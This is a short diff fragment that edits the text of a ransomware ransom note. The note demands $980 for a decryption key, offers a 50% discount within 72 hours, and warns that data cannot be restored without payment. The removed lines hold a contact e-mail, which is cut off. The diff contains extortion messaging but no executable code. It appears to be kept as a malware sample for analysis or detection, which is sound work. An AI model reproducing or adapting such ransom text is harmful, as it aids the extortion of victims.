@@ -12,8 +12,4 @@ https://we.tl/t-bs3qPf67hU
 Price of private key and decrypt software is $980.
 Discount 50% available if you contact us first 72 hours, that's price for you is $490.
 Please note that you'll never restore your data without payment.
-Check your e-mail "Spam" or "Junk" folder if you don't get answer more than 6 hours.
-
-
-To get this software you need write on our e-mail:
-support@freshma
+Check your e-mail "Spam" or "Junk" folder if you don't get a
